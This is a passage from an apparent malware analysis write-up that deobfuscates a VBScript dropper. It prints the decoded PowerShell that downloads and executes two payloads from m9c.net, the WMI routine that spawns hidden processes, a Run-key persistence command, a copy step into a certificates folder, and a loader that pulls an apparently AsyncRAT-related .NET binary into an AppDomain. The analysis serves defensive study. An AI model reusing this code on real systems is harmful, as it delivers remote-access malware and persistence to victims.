64,Zillya0Zillya,80Zillya,30Zillya,ZillyaZillyaZillya,ZillyaZillyaZillya,30Zillya,23,2ZillyaZillya,90Zillya,ZillyaZillyaZillya,99,54,23,0ZillyaZillya,ZillyaZillyaZillya,50Zillya,6ZillyaZillya,99,Zillya0Zillya,0ZillyaZillya,0ZillyaZillya,ZillyaZillyaZillya,99,54,6ZillyaZillya,5ZillyaZillya,Zillya0Zillya,6ZillyaZillya,23,Zillya6,23,30Zillya,0ZillyaZillya,50Zillya,2ZillyaZillya,63,32Zillya,23,ZillyaZillyaZillya,00Zillya(@=DSAQWESZXDRTFCVGYUHBNJIOKMLP$"
f=replace(f,"Zillya","1")

# replace 
f="X`E`I|)DSAQWESZXDRTFCVGYUHBNJIOKMLP$(gnirtSteG.IICSA::]gnidocnE.txeT.metsyS[;)14,201,63,44,93,101,021,101,64,05,15,801,801,001,011,711,411,93,04,401,611,111,28,011,79,501,411,111,801,07,85,85,39,511,211,111,411,15,89,121,76,19,95,88,69,96,69,37,421,14,93,021,84,93,44,93,29,74,93,04,101,99,79,801,211,101,411,64,14,93,301,211,601,64,05,55,55,55,35,05,15,55,65,35,94,74,511,001,79,111,801,211,711,74,611,101,011,64,99,75,901,64,911,911,911,74,74,85,211,611,611,401,93,44,001,111,401,611,101,77,85,85,39,101,211,121,48,801,801,79,76,64,99,501,511,79,66,801,79,711,511,501,68,64,611,201,111,511,111,411,99,501,77,19,44,14,93,011,93,44,93,53,53,53,53,93,04,101,99,79,801,211,101,411,64,93,301,53,53,53,53,501,411,611,38,001,79,111,801,53,53,53,53,911,111,86,93,44,14,611,011,101,501,801,76,89,101,78,64,611,101,87,23,611,99,101,601,89,97,54,911,101,87,04,04,101,901,79,011,121,66,801,801,79,76,85,85,39,011,111,501,611,99,79,411,101,611,011,37,64,99,501,511,79,66,801,79,711,511,501,68,64,611,201,111,511,111,411,99,501,77,19,16,201,63,39,39,19,101,611,121,66,19,95,88,69,96,69,37,421,14,93,301,211,601,64,94,55,55,55,35,05,15,55,65,35,94,74,511,001,79,111,801,211,711,74,611,101,011,64,99,75,901,64,911,911,911,74,74,85,211,611,611,401,93,44,001,111,401,611,101,77,85,85,39,101,211,121,48,801,801,79,76,64,99,501,511,79,66,801,79,711,511,501,68,64,611,201,111,511,111,411,99,501,77,19,44,14,93,011,93,44,93,53,53,53,53,93,04,101,99,79,801,211,101,411,64,93,301,53,53,53,53,501,411,611,38,001,79,111,801,53,53,53,53,911,111,86,93,44,14,611,011,101,501,801,76,89,101,78,64,611,101,87,23,611,99,101,601,89,97,54,911,101,87,04,04,101,901,79,011,121,66,801,801,79,76,85,85,39,011,111,501,611,99,79,411,101,611,011,37,64,99,501,511,79,66,801,79,711,511,501,68,64,611,201,111,511,111,411,99,501,77,19,16,601,201,63,95,14,93,99,501,511,79,66,801,79,711,511,501,68,64,611,201,111,511,111,411,99,501,77,93,04,101,901,79,87,801,79,501,611,411,79,08,401,611,501,78,001,79,111,67,85,85,39,121,801,89,901,101,511,511,56,64,011,111,501,611,99,101,801,201,101,28,64,901,101,611,511,121,38,19,23,39,001,501,111,811,19,95,14,301,011,501,211,63,04,23,801,501,611,011,711,23,521,611,101,501,711,18,54,23,94,23,611,011,711,111,99,54,23,901,111,99,64,101,801,301,111,111,301,23,211,901,111,99,54,23,011,111,501,611,99,101,011,011,111,99,54,611,511,101,611,23,16,23,301,011,501,211,63,321,23,111,001(@=DSAQWESZXDRTFCVGYUHBNJIOKMLP$"

# reversed (this is what actually gets called)
"$PLMKOIJNBHUYGVCFTRDXZSEWQASD=@(100,111,32,123,36,112,105,110,103,32,61,32,116,101,115,116,45,99,111,110,110,101,99,116,105,111,110,32,45,99,111,109,112,32,103,111,111,103,108,101,46,99,111,109,32,45,99,111,117,110,116,32,49,32,45,81,117,105,101,116,125,32,117,110,116,105,108,32,40,36,112,105,110,103,41,59,91,118,111,105,100,93,32,91,83,121,115,116,101,109,46,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121,93,58,58,76,111,97,100,87,105,116,104,80,97,114,116,105,97,108,78,97,109,101,40,39,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,39,41,59,36,102,106,61,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,73,110,116,101,114,97,99,116,105,111,110,93,58,58,67,97,108,108,66,121,110,97,109,101,40,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,44,39,68,111,119,35,35,35,35,108,111,97,100,83,116,114,105,35,35,35,35,103,39,46,114,101,112,108,97,99,101,40,39,35,35,35,35,39,44,39,110,39,41,44,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,67,97,108,108,84,121,112,101,93,58,58,77,101,116,104,111,100,44,39,104,116,116,112,58,47,47,119,119,119,46,109,57,99,46,110,101,116,47,117,112,108,111,97,100,115,47,49,53,56,55,51,50,53,55,55,55,49,46,106,112,103,39,41,124,73,96,69,96,88,59,91,66,121,116,101,91,93,93,36,102,61,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,73,110,116,101,114,97,99,116,105,111,110,93,58,58,67,97,108,108,66,121,110,97,109,101,40,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,44,39,68,111,119,35,35,35,35,108,111,97,100,83,116,114,105,35,35,35,35,103,39,46,114,101,112,108,97,99,101,40,39,35,35,35,35,39,44,39,110,39,41,44,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,67,97,108,108,84,121,112,101,93,58,58,77,101,116,104,111,100,44,39,104,116,116,112,58,47,47,119,119,119,46,109,57,99,46,110,101,116,47,117,112,108,111,97,100,115,47,49,53,56,55,51,50,53,55,55,55,50,46,106,112,103,39,41,46,114,101,112,108,97,99,101,40,39,47,92,39,44,39,48,120,39,41,124,73,96,69,96,88,59,91,67,121,98,51,114,111,112,115,93,58,58,70,108,111,114,105,97,110,82,111,116,104,40,39,114,117,110,100,108,108,51,50,46,101,120,101,39,44,36,102,41);[System.Text.Encoding]::ASCII.GetString($PLMKOIJNBHUYGVCFTRDXZSEWQASD)|I`E`X"=f

# from dec so we can see it better
"$PLMKOIJNBHUYGVCFTRDXZSEWQASD=@(do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$fj=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow####loadStri####g'.replace('####','n'),[Microsoft.VisualBasic.CallType]::Method,'http://www.m9c.net/uploads/15873257771.jpg')|I`E`X;[Byte[]]$f=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow####loadStri####g'.replace('####','n'),[Microsoft.VisualBasic.CallType]::Method,'http://www.m9c.net/uploads/15873257772.jpg').replace('/\','0x')|I`E`X;[Cyb3rops]::FlorianRoth('rundll32.exe',$f))|I`E`X"
```


the last stage all pretty - this is all stored in the var `f` as 
```text
"$PLMKOIJNBHUYGVCFTRDXZSEWQASD=@
( 
    do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);

    [void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');
    $fj=[Microsoft.VisualBasic.Interaction]::CallByname(
            (New-Object Net.WebClient),'Dow####loadStri####g'.replace('####','n'),
            [Microsoft.VisualBasic.CallType]::Method,'http://www.m9c.net/uploads/15873257771.jpg'
    )|I`E`X;
    
    [Byte[]] $f=[Microsoft.VisualBasic.Interaction]::CallByname(
        (New-Object Net.WebClient),'Dow####loadStri####g'.replace('####','n'),
        [Microsoft.VisualBasic.CallType]::Method,'http://www.m9c.net/uploads/15873257772.jpg'
    ).replace('/\','0x')|I`E`X;
    
    [Cyb3rops]::FlorianRoth('rundll32.exe',$f)

)|I`E`X"
```

finally in line 74, we can see the `f` var being used as a parameter to the`InternetSecurity` function which actually invokies it
  
days is defined in line 22 and 50  
line 22,50  
```text
days=Array("P","o","w","e","r","s","h","e","l","l")
```
line 74
```text
InternetSecurity(Join(days,"")+space(1)+StrReverse(f))
``` 

```text
Sub InternetSecurity(AhnLabV3InternetSecurity)
    strCommand = AhnLabV3InternetSecurity
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    intReturn = objProcess.Create(strCommand, Null, objConfig, intProcessID)
End Sub
```


lines 76:95 deal with additional persistence of the VBS to the running users `\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates` path
```text
set xURTgmcCEzyS = CreateObject("Scripting.FileSystemObject")
CurrentDirectory = xURTgmcCEzyS.GetParentFolderName(WScript.ScriptFullName)
sname= wsh.scriptname
startupfolder="C:\Users\"+CreateObject("WScript.Network").UserName+"\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates"

InternetSecurity(Join(days,"")+" Set-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Value "+"'"+startupfolder+ "\"+ sname+"'")

if CurrentDirectory = startupfolder Then
    WScript.Quit()
else
    FUCKYOU_ESETNOD32Antivirus()
End if
Sub FUCKYOU_ESETNOD32Antivirus()
    If (xURTgmcCEzyS.FileExists(CurrentDirectory+ "\"+ sname)) Then
    sSourceFile   = CurrentDirectory+ "\"+ sname
    FUCKYOU_ZoneAlarmAntivirusKasperskyInternetSecurity = "CmD /C CopY """ & sSourceFile & """ """ & startupfolder & """ /Y"
    InternetSecurity(FUCKYOU_ZoneAlarmAntivirusKasperskyInternetSecurity)
      WScript.Quit()
    Else
      WScript.Quit()
    End If
End Sub
```


#### Executed PowerShell

left from this is powershell that gets run via WMI via the `InternetSecurity` function 

```text
"$PLMKOIJNBHUYGVCFTRDXZSEWQASD=@
( 
    do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);

    [void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');
    $fj=[Microsoft.VisualBasic.Interaction]::CallByname(
            (New-Object Net.WebClient),'Dow####loadStri####g'.replace('####','n'),
            [Microsoft.VisualBasic.CallType]::Method,'http://www.m9c.net/uploads/15873257771.jpg'
    )|I`E`X;
    
    [Byte[]] $f=[Microsoft.VisualBasic.Interaction]::CallByname(
        (New-Object Net.WebClient),'Dow####loadStri####g'.replace('####','n'),
        [Microsoft.VisualBasic.CallType]::Method,'http://www.m9c.net/uploads/15873257772.jpg'
    ).replace('/\','0x')|I`E`X;
    
    [Cyb3rops]::FlorianRoth('rundll32.exe',$f)

)|I`E`X"
```

Looking at this, we see it downloads and executes to jpgs from `m9c[.]net`.  Lets take a look at the first one 

##### 7771.jpg
`http://www.m9c.net/uploads/15873257771.jpg`

The returned data looks like some obfuscated powershell

![](images/7771_jpg.png)

the full returned data is available in [malware_lives_here/artifacts/7771_jpg.bin]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/malware_lives_here/artifacts/7771_jpg.bin)  

This powershell can be deobfuscated down to the following which loads an executable into an Application Domain.  The binary can be extracted and is available in [malware_lives_here/artifacts/519e7df096fdefdb29b37b2ff7919bab.bin](malware_lives_here/artifacts/519e7df096fdefdb29b37b2ff7919bab.bin).  it has an md5 of `519e7df096fdefdb29b37b2ff7919bab`  


```text
    $R25='REX'.replace('R','I');
    sal g $R25;
    [Byte[]]$M4LS3C4N0N1M31337=('/\4D,/\5A,/\90,/\00,/\03,/\00,/\00,/\00,/\04,/\00,/\00,/\00,/\FF,/\FF,/\00,/\00,/\B8,
        /\00,/\00,/\00,/\00,/\00,/\00,/\00,/\40,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,
        /\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\80,
        /\00,/\00,/\00,/\0E,/\1F,/\BA,/\0E,/\00,/\B4,/\09,/\CD,/\21,/\B8,/\01,/\4C,/\CD,/\21,/\54,/\68,/\69,/\73,/\20,
        /\70,/\72,/\6F,/\67,/\72,/\61,/\6D,/\20,/\63,/\61,/\6E,/\6E,/\6F,/\74,/\20,/\62,/\65,/\20,/\72,/\75,/\6E,/\20,
        /\69,/\6E,/\20,/\44,/\4F,/\53,/\20,/\6D,/\6F,/\64,/\65,/\2E,/\0D,/\0D,/\0A,/\24,/\00,/\00,/\00,/\00,/\00,/\00,
        /\00,/\50,/\45,/\00,/\00,/\4C,/\01,/\03,/\00,/\30,/\C6,/\90,/\5E,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\E0,
        /\00,/\22,/\20,/\0B,/\01,/\30,/\00,/\00,/\44,/\01,/\00,/\00,/\08,/\00,/\00,/\00,/\00,/\00,/\00,/\EE,/\63,/\01,
        /\00,/\00,/\20,/\00,/\00,/\00,/\80,/\01,/\00,/\00,/\00,/\00,/\10,/\00,/\20,/\00,/\00,/\00,/\02,/\00,/\00,/\04,
        /\00,/\00,/\00,/\00,/\00,/\00,/\00,/\04,
        [..snip...]
        00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,
        /\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00,/\00'.replace('/\','0x')
        )| g;

    $j=[AppDomain]::CreateDomain('Trusted Appdomain',$null,[AppDomain]::CurrentDomain::SetupInformation::ApplicationBase);
    $j.PermissionSet.IsUnrestricted();
    $j.SetCachePath('C:\Users\Public');$j.AppendPrivatePath('C:\Users\Public');
    $j.[Reflection.Assembly]::Load($M4LS3C4N0N1M31337)
```

###### Quick Static Analysis 
Running file on the binary shows a .net binary
```text
519e7df096fdefdb29b37b2ff7919bab.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Runing strings show some very interesting results. 

![AsyncRAT reference]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/images/519e_strings_1.png)
  
![AsyncRAT reference]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/images/519e_strings_2.png)
  
Seems, kinda interesting, lets throw  this into DNSpy real quick and take a look.

 
#### 7772.jpg
`http://www.m9c.net/uploads/15873257772.jpg`

The returned data looks like a slightly obfuscated hex encoded binary, which comes out to be md5 1b3f8c92d5d1ace34fa4dc2dd80c3eb7 and is available at [malware_lives_here/artifacts/1b3f8c92d5d1ace34fa4dc2dd80c3eb7.bin](malware_lives_here/artifacts/1b3f8c92d5d1ace34fa4dc2dd80c3eb7.bin)    


